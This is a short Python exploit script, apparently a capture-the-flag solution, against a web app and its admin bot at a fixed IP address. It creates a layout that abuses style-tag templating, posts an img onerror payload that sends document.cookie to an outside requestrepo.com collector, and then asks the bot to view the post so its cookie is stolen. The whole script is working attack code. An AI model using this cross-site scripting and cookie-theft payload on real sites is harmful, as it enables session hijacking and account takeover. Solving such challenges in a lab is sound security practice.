import requests

WEB_URL = 'http://1.95.132.78:3000'
BOT_URL = 'http://1.95.132.78:1337'
ATTACKER_URL = 'https://ol1q3yh0.requestrepo.com'

session = requests.session()

layout = 'a<style>{{content}}<{{content}}</style>'
res = session.post(f'{WEB_URL}/api/layout', json={ 'layout': layout })
if not res.ok:
    print(res.text)
    exit(1)
layoutId = res.json()['id']

res = session.post(f'{WEB_URL}/api/post', json={
    'content': f'img src onerror=fetch(`{ATTACKER_URL}/`+document.cookie) <style></style>',
    'layoutId': layoutId,
})
if not res.ok:
    print(res.text)
    exit(1)
postId = res.json()['id']

res = requests.post(f'{BOT_URL}/api/report', json={ 'postId': postId })
print(res.text)
